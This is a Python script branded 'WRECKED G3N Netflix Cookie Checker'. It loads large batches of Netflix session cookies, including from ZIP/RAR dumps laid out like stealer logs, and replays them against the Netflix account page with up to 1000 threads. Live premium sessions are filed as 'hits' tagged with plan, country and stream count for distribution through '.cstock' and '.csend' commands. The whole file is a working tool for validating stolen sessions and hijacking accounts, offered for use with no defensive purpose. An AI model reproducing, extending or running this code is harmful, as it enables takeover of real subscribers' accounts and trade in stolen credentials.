import requests
import os
import threading
import colorama
import shutil
import re
import json
import time
import traceback
import zipfile
import rarfile
import argparse
import sys
import queue
import concurrent.futures
from datetime import datetime

# Global counters
total_working = 0
total_fails = 0
total_unsubscribed = 0
total_checked = 0
total_broken = 0
lock = threading.Lock()
last_update_time = time.time()  # Track time for progress updates
update_interval = 0.001  # Update progress every millisecond (1/1000 of a second)

# Maximum limits
MAX_THREADS = 1000  # Maximum number of threads for cookie checking

# Global paths
working_cookies_dir = "working_cookies"
temp_dir = "temp"
MAX_RECURSION_DEPTH = 5  # Prevent infinite recursion
NETFLIX_DIR = "netflix"  # Direct netflix folder for commands like .cstock and .csend
dirs = {
    "netflix": {
        "root": NETFLIX_DIR, 
        "hits": "working_cookies/netflix/premium",
        "failures": "working_cookies/netflix/failures", 
        "broken": "working_cookies/netflix/broken",
        "free": "working_cookies/netflix/free"
    }
}

def debug_print(message):
    """Print debug messages with timestamp"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"[{timestamp}] {message}")

def setup_directories():
    """Setup all required directories"""
    for service in dirs.values():
        for directory in service.values():
            os.makedirs(directory, exist_ok=True)
    
    # Create base working cookies directory if it doesn't exist
    os.makedirs(working_cookies_dir, exist_ok=True)
    
    # Create netflix directory for command access
    os.makedirs(NETFLIX_DIR, exist_ok=True)
    
    # Create temporary extraction directory for archives
    os.makedirs(os.path.join(temp_dir, "netflix", "extracted"), exist_ok=True)

def print_banner():
    """Print the Netflix cookie checker banner"""
    print(colorama.Fore.RED + """
███╗░░██╗███████╗████████╗███████╗██╗░░░░░██╗██╗░░██╗  ░█████╗░░█████╗░░█████╗░██╗░░██╗██╗███████╗
████╗░██║██╔════╝╚══██╔══╝██╔════╝██║░░░░░██║╚██╗██╔╝  ██╔══██╗██╔══██╗██╔══██╗██║░██╔╝██║██╔════╝
██╔██╗██║█████╗░░░░░██║░░░█████╗░░██║░░░░░██║░╚███╔╝░  ██║░░╚═╝██║░░██║██║░░██║█████═╝░██║█████╗░░
██║╚████║██╔══╝░░░░░██║░░░██╔══╝░░██║░░░░░██║░██╔██╗░  ██║░░██╗██║░░██║██║░░██║██╔═██╗░██║██╔══╝░░
██║░╚███║███████╗░░░██║░░░██║░░░░░███████╗██║██╔╝╚██╗  ╚█████╔╝╚█████╔╝╚█████╔╝██║░╚██╗██║███████╗
╚═╝░░╚══╝╚══════╝░░░╚═╝░░░╚═╝░░░░░╚══════╝╚═╝╚═╝░░╚═╝  ░╚════╝░░╚════╝░░╚════╝░╚═╝░░╚═╝╚═╝╚══════╝
               
                   ░█████╗░██╗░░██╗███████╗░█████╗░██╗░░██╗███████╗██████╗░
                   ██╔══██╗██║░░██║██╔════╝██╔══██╗██║░██╔╝██╔════╝██╔══██╗
                   ██║░░╚═╝███████║█████╗░░██║░░╚═╝█████═╝░█████╗░░██████╔╝
                   ██║░░██╗██╔══██║██╔══╝░░██║░░██╗██╔═██╗░██╔══╝░░██╔══██╗
                   ╚█████╔╝██║░░██║███████╗╚█████╔╝██║░╚██╗███████╗██║░░██║
                   ░╚════╝░╚═╝░░╚═╝╚══════╝░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝                      
                                   
                            WRECKED G3N Netflix Cookie Checker
                                                                       
    """ + colorama.Fore.RESET)
    print("---------------------------------------------------------------------------------------------")

def convert_to_netscape_format(cookie):
    """Convert the cookie dictionary to the Netscape cookie format string"""
    try:
        return "{}\t{}\t{}\t{}\t{}\t{}\t{}".format(
            cookie.get('domain', '.netflix.com'), 
            'TRUE' if cookie.get('flag', 'TRUE').upper() == 'TRUE' else 'FALSE', 
            cookie.get('path', '/'),
            'TRUE' if cookie.get('secure', True) else 'FALSE', 
            cookie.get('expiration', str(int(time.time()) + 86400)), 
            cookie.get('name', ''), 
            cookie.get('value', '')
        )
    except Exception as e:
        debug_print(f"Error converting cookie to Netscape format: {e}")
        return None

def process_json_files(directory):
    """Process JSON files and convert them to Netscape format"""
    json_after_conversion_folder = os.path.join(directory, "json_cookies_after_conversion")
    os.makedirs(json_after_conversion_folder, exist_ok=True)
    
    json_files = [f for f in os.listdir(directory) if f.endswith(".json")]
    debug_print(f"Found {len(json_files)} JSON files to convert in {directory}")
    
    for filename in json_files:
        file_path = os.path.join(directory, filename)
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as file:
                try:
                    cookies = json.load(file)
                    if isinstance(cookies, list) and cookies:
                        if 'domain' in cookies[0]:
                            netscape_cookie_file = os.path.join(directory, filename.replace('.json', '.txt'))
                            valid_lines = []
                            for cookie in cookies:
                                line = convert_to_netscape_format(cookie)
                                if line:
                                    valid_lines.append(line + '\n')
                            
                            if valid_lines:
                                with open(netscape_cookie_file, 'w', encoding='utf-8') as outfile:
                                    outfile.writelines(valid_lines)
                                debug_print(f"Converted {filename} to Netscape format")
                                shutil.move(file_path, os.path.join(json_after_conversion_folder, filename))
                except json.JSONDecodeError:
                    debug_print(f"Error decoding JSON from file {filename}")
        except Exception as e:
            debug_print(f"Error processing JSON file {filename}: {e}")

def load_cookies_from_file(cookie_file):
    """Load cookies from a given file and return a dictionary of cookies."""
    global total_broken, dirs
    cookies = {}
    try:
        # Check file extension first
        file_ext = os.path.splitext(cookie_file)[1].lower()
        
        # If this is an archive file that somehow wasn't caught by the directory processor
        if file_ext in ['.zip', '.rar']:
            debug_print(f"Warning: Attempting to load cookies directly from archive file: {cookie_file}")
            debug_print("This should have been handled by the archive extraction process")
            
            # Create a temporary extraction directory
            extract_dir = os.path.join(os.path.dirname(cookie_file), f"temp_extracted_{os.path.basename(cookie_file)}")
            os.makedirs(extract_dir, exist_ok=True)
            
            # Try to extract and find cookie files
            if extract_from_archive(cookie_file, extract_dir):
                # Find any TXT files in the extracted directory
                cookie_files = []
                for root, dirs_list, files in os.walk(extract_dir):
                    for file in files:
                        if file.lower().endswith('.txt'):
                            cookie_files.append(os.path.join(root, file))
                
                # If we found cookie files, process all of them (not just the first)
                # But for the initial cookie functionality, still return cookies from the first file
                if cookie_files:
                    # For now, use the first cookie file for this function's return value
                    # The process_directory function will handle checking all files properly
                    debug_print(f"Found {len(cookie_files)} cookie files in archive, using the first one for initial check")
                    return load_cookies_from_file(cookie_files[0])
            
            debug_print("Could not find any valid cookie files in the archive")
            # We'll continue trying to parse the archive file as a text file (will likely fail)
        
        # Try with different encodings to handle various file formats
        encodings_to_try = ['utf-8', 'latin-1', 'ascii']
        file_content = None
        
        for encoding in encodings_to_try:
            try:
                with open(cookie_file, 'r', encoding=encoding, errors='ignore') as f:
                    file_content = f.read()
                break  # If successful, stop trying different encodings
            except UnicodeDecodeError:
                continue
        
        if not file_content:
            debug_print(f"Could not read file content with any encoding: {cookie_file}")
            raise ValueError("Failed to read file with any encoding")
        
        # Check if it might be a binary file (like an archive) by looking for common binary markers
        # This is a simple heuristic to detect non-text files
        if '\x00' in file_content or file_content.startswith('PK') or file_content.startswith('Rar!'):
            debug_print(f"File appears to be binary (possibly an archive): {cookie_file}")
            raise ValueError("File appears to be binary, not a text cookie file")
        
        # Process each line in the file content
        for line in file_content.splitlines():
            # Skip comment lines and empty lines
            if not line.strip() or line.strip().startswith('#'):
                continue
                
            # First try tab-separated Netscape format (domain\tFLAG\tpath\tSSL\texpiry\tname\tvalue)
            parts = line.strip().split('\t')
            if len(parts) >= 7:
                try:
                    domain, _, path, secure, expires, name, value = parts[:7]
                    # Clean and validate cookie name and value
                    name = name.strip()
                    value = value.strip()
                    
                    if name and isinstance(name, str):
                        # Ensure value is properly formatted
                        cookies[name] = value.strip('"\'')
                except Exception as e:
                    debug_print(f"Error parsing Netscape format line: {e}")
                    continue
            elif '=' in line:  # Try to handle key=value format (common in HTTP headers)
                for pair in line.split(';'):
                    try:
                        pair = pair.strip()
                        if '=' in pair:
                            name, value = pair.split('=', 1)
                            name = name.strip()
                            value = value.strip().strip('"\'')
                            
                            if name:
                                cookies[name] = value
                    except Exception as e:
                        debug_print(f"Error parsing cookie pair: {e}")
                        continue
    except Exception as e:
        debug_print(f"Error loading cookies from {cookie_file}: {str(e)}")
        if 'netflix' in dirs and 'broken' in dirs['netflix'] and os.path.exists(cookie_file):
            broken_folder = dirs["netflix"]["broken"]
            shutil.move(cookie_file, os.path.join(broken_folder, os.path.basename(cookie_file)))
        with lock:
            total_broken += 1
    
    # Check if we found any cookies
    if not cookies:
        debug_print(f"No cookies found in file: {cookie_file}")
    else:
        debug_print(f"Found {len(cookies)} cookies in file: {cookie_file}")
    
    # Look for specific Netflix cookies
    netflix_keys = ['NetflixId', 'SecureNetflixId']
    if any(key in cookies for key in netflix_keys):
        debug_print(f"Netflix authentication cookies found in file: {cookie_file}")
    
    return cookies

def make_request_with_cookies(cookies):
    """Make an HTTP request to Netflix using provided cookies."""
    session = requests.Session()
    
    # Sanitize cookie values to prevent encoding issues
    safe_cookies = {}
    for key, value in cookies.items():
        try:
            # Convert value to string and sanitize
            if value is not None:
                # More aggressive sanitization:
                # 1. Strip any surrounding quotes or spaces
                # 2. Remove any non-ASCII characters
                # 3. Ensure the value is URL-encodable
                if isinstance(value, str):
                    value = value.strip().strip('"\'')
                safe_value = str(value).encode('ascii', 'ignore').decode('ascii')
                
                # Additional check to handle any problematic characters
                # This ensures only valid URL-safe characters are kept
                safe_value = re.sub(r'[^\x00-\x7F]+', '', safe_value)
                safe_cookies[key] = safe_value
        except Exception as e:
            debug_print(f"Error sanitizing cookie {key}: {str(e)}")
            # Skip problematic cookies
            continue
    
    # If important Netflix cookies are missing, don't even try the request
    required_cookies = ['NetflixId', 'SecureNetflixId']
    if not any(cookie in safe_cookies for cookie in required_cookies):
        debug_print("Missing essential Netflix cookies, skipping request")
        return ""
    
    # Update session with sanitized cookies
    session.cookies.update(safe_cookies)
    
    # Use minimal headers to avoid encoding issues
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
    }
    
    try:
        # Add more comprehensive exception handling
        response = session.get("https://www.netflix.com/YourAccount", headers=headers, timeout=10)
        return response.text
    except requests.exceptions.RequestException as e:
        debug_print(f"Request error: {str(e)}")
        return ""
    except UnicodeError as e:
        debug_print(f"Unicode encoding error: {str(e)}")
        return ""
    except Exception as e:
        debug_print(f"Unexpected error during request: {str(e)}")
        return ""

def extract_info(response_text):
    """Extract relevant information from the Netflix account page."""
    patterns = {
        'countryOfSignup': r'"countryOfSignup":\s*"([^"]+)"',
        'memberSince': r'"memberSince":\s*"([^"]+)"',
        'userGuid': r'"userGuid":\s*"([^"]+)"',
        'showExtraMemberSection': r'"showExtraMemberSection":\s*\{\s*"fieldType":\s*"Boolean",\s*"value":\s*(true|false)',
        'membershipStatus': r'"membershipStatus":\s*"([^"]+)"',
        'maxStreams': r'maxStreams\":\{\"fieldType\":\"Numeric\",\"value\":([^,]+),',
        'localizedPlanName': r'localizedPlanName\":\{\"fieldType\":\"String\",\"value\":\"([^"]+)\"'
    }
    
    extracted_info = {}
    for key, pattern in patterns.items():
        match = re.search(pattern, response_text)
        extracted_info[key] = match.group(1) if match else None
    
    # Additional processing for special fields
    if extracted_info['localizedPlanName']:
        extracted_info['localizedPlanName'] = extracted_info['localizedPlanName'].replace('x28', '').replace('\\', ' ').replace('x20', '').replace('x29', '')
    
    if extracted_info['memberSince']:
        extracted_info['memberSince'] = extracted_info['memberSince'].replace("\\x20", " ")
    
    if extracted_info['showExtraMemberSection']:
        extracted_info['showExtraMemberSection'] = extracted_info['showExtraMemberSection'].capitalize()
    
    # Check if we have critical fields
    if not extracted_info['countryOfSignup'] or extracted_info['countryOfSignup'] == "null":
        raise ValueError("Could not extract country of signup, likely not a valid login")
    
    return extracted_info

def handle_successful_login(cookie_file, info, is_subscribed):
    """Handle the actions required after a successful Netflix login."""
    global total_working, total_unsubscribed
    
    if not is_subscribed:
        with lock:
            total_unsubscribed += 1
        debug_print(f"Login successful with {cookie_file}, but not subscribed. Moving to free folder.")
        free_folder = dirs["netflix"]["free"]
        shutil.move(cookie_file, os.path.join(free_folder, os.path.basename(cookie_file)))
        return
    
    with lock:
        total_working += 1
    debug_print(f"Login successful with {cookie_file} - Country: {info['countryOfSignup']}, Member since: {info['memberSince']}")
    
    # Create a meaningful filename - strip paths and make safe
    base_filename = os.path.basename(cookie_file)
    # Clean the filename to avoid invalid characters
    plan_name = info.get('localizedPlanName', 'Unknown').replace(' ', '_')
    country = info['countryOfSignup']
    is_extra = info.get('showExtraMemberSection', 'unknown')
    
    # Make sure filename is safe for filesystem
    safe_filename = f"{country}_{plan_name}_{is_extra}_{base_filename}"
    safe_filename = re.sub(r'[\\/*?:"<>|]', '_', safe_filename)
    
    # Prepare the destination folders
    hits_folder = dirs["netflix"]["hits"]
    os.makedirs(hits_folder, exist_ok=True)
    os.makedirs(NETFLIX_DIR, exist_ok=True)
    
    # Create paths for both locations
    organized_filepath = os.path.join(hits_folder, safe_filename)
    netflix_filepath = os.path.join(NETFLIX_DIR, f"Premium_{country}_{base_filename}")
    
    # Read the original cookie content
    with open(cookie_file, 'r', encoding='utf-8', errors='ignore') as infile:
        original_cookie_content = infile.read()
    
    # Fix various naming and formatting issues
    plan_name = info.get('localizedPlanName', 'Unknown').replace("miembro u00A0extra", "(Extra Member)")
    member_since = info.get('memberSince', 'Unknown').replace("\x20", " ")
    max_streams = info.get('maxStreams', 'Unknown')
    if max_streams:
        max_streams = max_streams.rstrip('}')
    
    # Convert boolean to Yes/No
    extra_members = "Yes" if info.get('showExtraMemberSection') == "True" else "No" if info.get('showExtraMemberSection') == "False" else "Unknown"
    
    # Prepare formatted content
    formatted_content = f"PLAN: {plan_name}\n"
    formatted_content += f"COUNTRY: {info['countryOfSignup']}\n"
    formatted_content += f"MAX STREAMS: {max_streams}\n"
    formatted_content += f"EXTRA MEMBERS: {extra_members}\n"
    formatted_content += f"MEMBER SINCE: {member_since}\n"
    formatted_content += f"CHECKED ON: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n\n"
    formatted_content += original_cookie_content
    
    # Write to both locations
    # 1. Write to organized folder
    with open(organized_filepath, 'w', encoding='utf-8') as outfile:
        outfile.write(formatted_content)
        
    # 2. Write to netflix folder for .cstock and .csend commands
    with open(netflix_filepath, 'w', encoding='utf-8') as outfile:
        outfile.write(formatted_content)
    
    # Remove the original file after successful processing
    if os.path.exists(cookie_file):
        os.remove(cookie_file)

    return {
        "plan": plan_name,
        "country": info['countryOfSignup'],
        "max_streams": max_streams,
        "extra_members": extra_members,
        "member_since": member_since
    }

def handle_failed_login(cookie_file):
    """Handle the actions required after a failed Netflix login."""
    global total_fails
    with lock:
        total_fails += 1
    
    debug_print(f"Login failed with {cookie_file}. Cookie expired or invalid.")
    failures_folder = dirs["netflix"]["failures"]
    if os.path.exists(cookie_file):
        shutil.move(cookie_file, os.path.join(failures_folder, os.path.basename(cookie_file)))

def process_cookie_file(cookie_file):
    """Process a single Netflix cookie file to check validity."""
    global total_checked, total_broken
    with lock:
        total_checked += 1
    
    result = {
        "valid": False,
        "details": None,
        "file": os.path.basename(cookie_file)
    }
    
    try:
        debug_print(f"Processing {cookie_file}")
        cookies = load_cookies_from_file(cookie_file)
        
        if not cookies:
            debug_print(f"No valid cookies found in {cookie_file}")
            broken_folder = dirs["netflix"]["broken"]
            if os.path.exists(cookie_file):
                shutil.move(cookie_file, os.path.join(broken_folder, os.path.basename(cookie_file)))
            with lock:
                total_broken += 1
            return result
        
        response_text = make_request_with_cookies(cookies)
        
        if not response_text:
            debug_print(f"Empty response for {cookie_file}")
            handle_failed_login(cookie_file)
            return result
        
        info = extract_info(response_text)
        is_subscribed = info.get('membershipStatus') == "CURRENT_MEMBER"
        
        if info.get('countryOfSignup') and info.get('countryOfSignup') != "null":
            details = handle_successful_login(cookie_file, info, is_subscribed)
            if is_subscribed:
                result["valid"] = True
                result["details"] = details
            return result
        else:
            handle_failed_login(cookie_file)
            return result
    except Exception as e:
        debug_print(f"Error processing {cookie_file}: {str(e)}")
        debug_print(traceback.format_exc())
        broken_folder = dirs["netflix"]["broken"]
        if os.path.exists(cookie_file):
            shutil.move(cookie_file, os.path.join(broken_folder, os.path.basename(cookie_file)))
        with lock:
            total_broken += 1
        return result

def worker(task_queue, results):
    """Worker thread to process Netflix cookie files using a queue system."""
    global last_update_time
    while True:
        try:
            # Get a task from the queue (non-blocking with timeout)
            cookie_file = task_queue.get(block=False)
            if cookie_file is None:  # Sentinel value to indicate end of tasks
                break
                
            debug_print(f"Thread processing cookie file: {os.path.basename(cookie_file)}")
            result = process_cookie_file(cookie_file)
            
            # Store results with thread safety
            with lock:
                results.append(result)
                
                # Check if it's time to print a progress update
                current_time = time.time()
                if current_time - last_update_time > update_interval:
                    last_update_time = current_time
                    checking_speed = total_checked / (current_time - start_time) if current_time > start_time else 0
                    print(f"Progress: Checked {total_checked} cookies | Valid: {total_working} | Failed: {total_fails} | Speed: {checking_speed:.2f} cookies/sec")
                
            # Mark task as complete
            task_queue.task_done()
            
        except queue.Empty:
            # No more tasks in the queue
            break
        except Exception as e:
            debug_print(f"Worker thread error: {str(e)}")
            # Mark task as done even if there was an error
            if 'cookie_file' in locals() and cookie_file is not None:
                task_queue.task_done()

def extract_from_archive(archive_path, extract_dir):
    """Extract files from a ZIP or RAR archive."""
    try:
        debug_print(f"Extracting archive: {archive_path} to {extract_dir}")
        file_ext = os.path.splitext(archive_path)[1].lower()
        
        if file_ext == '.zip':
            debug_print("Processing ZIP file")
            try:
                with zipfile.ZipFile(archive_path, 'r') as zip_ref:
                    # List all files in the archive
                    file_list = zip_ref.namelist()
                    debug_print(f"ZIP contains {len(file_list)} files/directories")
                    
                    # Check if there are nested archives inside this ZIP
                    nested_archives = []
                    for f in file_list:
                        if f.lower().endswith('.zip') or f.lower().endswith('.rar'):
                            nested_archives.append(f)
                    
                    if nested_archives:
                        debug_print(f"Found {len(nested_archives)} nested archives inside ZIP")
                    
                    # Filter out problematic filenames before extraction
                    safe_file_list = []
                    for file_path in file_list:
                        try:
                            # Test if the filename can be properly encoded
                            file_path.encode('latin-1')
                            safe_file_list.append(file_path)
                        except UnicodeEncodeError:
                            debug_print(f"Skipping file with problematic name: {file_path}")
                            continue
                    
                    debug_print(f"Extracting {len(safe_file_list)} safe files out of {len(file_list)} total")
                    
                    # Extract all safe files (including folders)
                    for file_path in safe_file_list:
                        try:
                            zip_ref.extract(file_path, extract_dir)
                        except Exception as ex:
                            debug_print(f"Error extracting {file_path}: {ex}")
                    
                debug_print("ZIP extraction completed")
                
                # Look for .txt files in the extracted content including subdirectories
                cookie_files = []
                for root, dirs, files in os.walk(extract_dir):
                    for file in files:
                        if file.lower().endswith('.txt'):
                            file_path = os.path.join(root, file)
                            debug_print(f"Found cookie file in extraction: {file_path}")
                            cookie_files.append(file_path)
                
                if cookie_files:
                    debug_print(f"Found {len(cookie_files)} cookie files in extracted content")
                else:
                    debug_print("No cookie files found in extracted content")
                
                return True
            except zipfile.BadZipFile as e:
                debug_print(f"Bad ZIP file: {e}")
                return False
                
        elif file_ext == '.rar':
            debug_print("Processing RAR file")
            try:
                with rarfile.RarFile(archive_path) as rar_ref:
                    # List all files in the archive
                    file_list = rar_ref.namelist()
                    debug_print(f"RAR contains {len(file_list)} files/directories")
                    
                    # Check if there are nested archives inside this RAR
                    nested_archives = []
                    for f in file_list:
                        if f.lower().endswith('.zip') or f.lower().endswith('.rar'):
                            nested_archives.append(f)
                    
                    if nested_archives:
                        debug_print(f"Found {len(nested_archives)} nested archives inside RAR")
                    
                    # Filter out problematic filenames
                    safe_file_list = []
                    for file_path in file_list:
                        try:
                            # Test if the filename can be properly encoded
                            file_path.encode('latin-1')
                            safe_file_list.append(file_path)
                        except UnicodeEncodeError:
                            debug_print(f"Skipping file with problematic name: {file_path}")
                            continue
                    
                    debug_print(f"Extracting {len(safe_file_list)} safe files out of {len(file_list)} total")
                    
                    # Extract only safe files (including folders)
                    for file_path in safe_file_list:
                        try:
                            rar_ref.extract(file_path, extract_dir)
                        except Exception as ex:
                            debug_print(f"Error extracting {file_path}: {ex}")
                    
                debug_print("RAR extraction completed")
                
                # Look for .txt files in the extracted content including subdirectories
                cookie_files = []
                for root, dirs, files in os.walk(extract_dir):
                    for file in files:
                        if file.lower().endswith('.txt'):
                            file_path = os.path.join(root, file)
                            debug_print(f"Found cookie file in extraction: {file_path}")
                            cookie_files.append(file_path)
                
                if cookie_files:
                    debug_print(f"Found {len(cookie_files)} cookie files in extracted content")
                else:
                    debug_print("No cookie files found in extracted content")
                
                return True
            except Exception as e:
                debug_print(f"Error with RAR file: {e}")
                # Create a note file about RAR extraction issues
                rar_note_path = os.path.join(extract_dir, "RAR_EXTRACTION_NOTE.txt")
                with open(rar_note_path, 'w') as f:
                    f.write(f"Error extracting RAR file: {e}\n")
                    f.write("If extraction fails, please extract manually and upload .txt files instead.\n")
                return False
        else:
            debug_print(f"Unsupported archive format: {file_ext}")
            return False
    except Exception as e:
        debug_print(f"Error extracting archive {archive_path}: {e}")
        return False

def process_directory(directory, processed_files=None, depth=0, max_depth=5):
    """Process a directory recursively for cookie files and archives."""
    if processed_files is None:
        processed_files = []
    
    # Prevent infinite recursion
    if depth > max_depth:
        debug_print(f"Maximum recursion depth reached for directory: {directory}")
        return []
    
    debug_print(f"Processing directory: {directory} (depth {depth})")
    cookie_files = []
    
    try:
        # Check if the directory exists
        if not os.path.exists(directory):
            debug_print(f"Directory does not exist: {directory}")
            return cookie_files
            
        # First, specifically check for cookie files in the cookies subdirectory if it exists
        cookies_dir = os.path.join(directory, "cookies")
        if os.path.exists(cookies_dir) and os.path.isdir(cookies_dir):
            debug_print(f"Found 'cookies' subdirectory: {cookies_dir}")
            for root, dirs, files in os.walk(cookies_dir):
                for file in files:
                    if file.lower().endswith('.txt'):
                        file_path = os.path.join(root, file)
                        debug_print(f"Found cookie file in cookies subdirectory: {file_path}")
                        cookie_files.append(file_path)
                        processed_files.append(file_path)
        
        # Now do the general recursive processing of all subdirectories
        for root, dirs, files in os.walk(directory):
            debug_print(f"Scanning {root}: found {len(files)} files and {len(dirs)} directories")
            
            # Process files in this directory
            for file in files:
                file_path = os.path.join(root, file)
                
                # Skip if already processed
                if file_path in processed_files:
                    debug_print(f"Skipping already processed file: {file_path}")
                    continue
                
                # Add to processed files
                processed_files.append(file_path)
                
                # Check file extension
                file_ext = os.path.splitext(file)[1].lower()
                
                # Process archives
                if file_ext in ['.zip', '.rar']:
                    debug_print(f"Found archive: {file_path}")
                    
                    # Create extraction directory with unique name based on full path
                    # This avoids conflicts when multiple archives have the same base name
                    extract_dir = os.path.join(
                        os.path.dirname(file_path), 
                        f"extracted_{os.path.splitext(os.path.basename(file_path))[0]}_{hash(file_path) % 10000}"
                    )
                    os.makedirs(extract_dir, exist_ok=True)
                    
                    # Extract archive
                    if extract_from_archive(file_path, extract_dir):
                        # Process extracted files
                        additional_files = process_directory(extract_dir, processed_files, depth + 1, max_depth)
                        if additional_files:
                            debug_print(f"Found {len(additional_files)} cookie files in archive: {file_path}")
                            cookie_files.extend(additional_files)
                        else:
                            debug_print(f"No cookie files found in archive: {file_path}")
                
                # Process txt files
                elif file_ext == '.txt':
                    debug_print(f"Found cookie file: {file_path}")
                    cookie_files.append(file_path)
            
            # Process one level at a time
            # Don't break here anymore to allow full traversal
    except Exception as e:
        debug_print(f"Error processing directory {directory}: {str(e)}")
    
    debug_print(f"Found {len(cookie_files)} cookie files in directory: {directory}")
    return cookie_files

def check_netflix_cookies(cookies_dir="netflix", num_threads=None):
    """Check all Netflix cookies in the specified directory using a thread pool."""
    global total_working, total_fails, total_unsubscribed, total_checked, total_broken
    total_working = total_fails = total_unsubscribed = total_checked = total_broken = 0
    
    # Set default threads if not specified
    if num_threads is None:
        # Check if args exists (from command line) and has threads attribute
        if 'args' in globals() and hasattr(args, 'threads'):
            num_threads = args.threads
        else:
            num_threads = MAX_THREADS
    
    # Ensure thread count is within limits
    num_threads = max(1, min(num_threads, MAX_THREADS))
    
    start_time = time.time()
    debug_print(f"Starting Netflix cookie check with up to {num_threads} threads")
    
    # Setup directories
    setup_directories()
    
    # Convert any JSON cookies to Netscape format
    process_json_files(cookies_dir)
    
    # Process the directory recursively to find all cookie files including in archives
    cookie_files = process_directory(cookies_dir)
    
    debug_print(f"Found {len(cookie_files)} Netflix cookie files to check")
    
    if not cookie_files:
        debug_print("No cookie files found.")
        return []
    
    # Process cookies with multiple threads using a queue
    results = []
    
    # Create a queue for tasks
    task_queue = queue.Queue()
    for cookie_file in cookie_files:
        task_queue.put(cookie_file)
    
    # Determine optimal number of threads (don't create more threads than files)
    num_threads = min(num_threads, len(cookie_files))
    debug_print(f"Using {num_threads} threads for processing {len(cookie_files)} cookie files")
    
    # Create and start worker threads
    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(
            target=worker,
            args=(task_queue, results)
        )
        thread.daemon = True
        thread.start()
        threads.append(thread)
    
    # Wait for all tasks to complete
    task_queue.join()
    
    # Stop the worker threads
    for _ in range(num_threads):
        try:
            task_queue.put(None)  # Send sentinel value to each thread
        except Exception:
            pass  # Ignore errors when stopping threads
    
    # Wait for all threads to finish
    for thread in threads:
        thread.join(timeout=1.0)  # Use timeout to avoid hanging
    
    elapsed_time = time.time() - start_time
    debug_print(f"Cookie checking completed in {elapsed_time:.2f} seconds")
    
    # Print statistics
    print_statistics()
    
    return results

def print_statistics():
    """Print statistics of the Netflix cookie checking process."""
    debug_print("\n--- Netflix Cookie Check Statistics ---")
    debug_print(f"Total checked: {total_checked}")
    debug_print(f"Working cookies: {total_working}")
    debug_print(f"Unsubscribed accounts: {total_unsubscribed}")
    debug_print(f"Failed cookies: {total_fails}")
    debug_print(f"Broken cookies: {total_broken}")
    debug_print("-------------------------------------\n")

def check_cookie(cookie_content):
    """Check a single Netflix cookie string."""
    # Create a temporary file for the cookie
    temp_dir = os.path.join("temp", "netflix")
    os.makedirs(temp_dir, exist_ok=True)
    
    temp_file = os.path.join(temp_dir, f"temp_cookie_{int(time.time())}.txt")
    
    try:
        with open(temp_file, 'w', encoding='utf-8') as f:
            f.write(cookie_content)
        
        result = process_cookie_file(temp_file)
        return result
    except Exception as e:
        debug_print(f"Error checking single cookie: {str(e)}")
        if os.path.exists(temp_file):
            os.remove(temp_file)
        return {"valid": False, "details": None, "file": "temp_cookie.txt"}

# Main function to run when script is executed directly
if __name__ == "__main__":
    colorama.init()
    print_banner()
    
    # Parse command-line arguments
    parser = argparse.ArgumentParser(description='Check Netflix cookies')
    parser.add_argument('input_file', nargs='?', help='File or directory to check')
    parser.add_argument('--all_cookies', action='store_true', help='Check all cookies in netflix directory')
    parser.add_argument('--threads', type=int, default=MAX_THREADS, help=f'Number of threads to use (1-{MAX_THREADS}, default: {MAX_THREADS})')
    args = parser.parse_args()
    
    # Validate and set thread count
    if args.threads < 1:
        args.threads = 1
    elif args.threads > MAX_THREADS:
        args.threads = MAX_THREADS
    
    debug_print(f"Using {args.threads} threads for processing")
    
    # Setup directories
    setup_directories()
    
    if args.all_cookies:
        # Check all cookies in the netflix directory
        debug_print("Checking all Netflix cookies...")
        print("Checking all Netflix cookies in the netflix directory...")
        
        if os.path.exists(NETFLIX_DIR):
            check_netflix_cookies(NETFLIX_DIR)
        else:
            error_msg = f"Error: Netflix directory not found at {NETFLIX_DIR}"
            print(error_msg)
            debug_print(error_msg)
            sys.exit(1)
    elif args.input_file:
        filepath = args.input_file
        if os.path.isfile(filepath):
            # If checking a single file
            debug_print(f"Checking single cookie file: {filepath}")
            
            # Check file extension to see if it's an archive
            file_ext = os.path.splitext(filepath)[1].lower()
            if file_ext in ['.zip', '.rar']:
                # For archives, extract and process all files
                extract_dir = os.path.join(os.path.dirname(filepath), f"temp_extracted_{os.path.basename(filepath)}")
                os.makedirs(extract_dir, exist_ok=True)
                
                if extract_from_archive(filepath, extract_dir):
                    # Process all extracted cookie files
                    cookie_files = process_directory(extract_dir)
                    
                    if cookie_files:
                        debug_print(f"Processing {len(cookie_files)} cookie files from archive")
                        
                        # Process each cookie file
                        results = []
                        for cookie_file in cookie_files:
                            result = process_cookie_file(cookie_file)
                            results.append(result)
                        
                        # Print statistics
                        print_statistics()
                    else:
                        debug_print("No cookie files found in the archive")
                        print_statistics()
                else:
                    # If extraction failed, try processing the archive as a regular file
                    result = process_cookie_file(filepath)
                    print_statistics()
            else:
                # For regular files, just process the single file
                result = process_cookie_file(filepath)
                print_statistics()
        else:
            # If it's a directory, check all files in it
            check_netflix_cookies(filepath)
    else:
        # Default behavior with no arguments - check netflix directory
        check_netflix_cookies()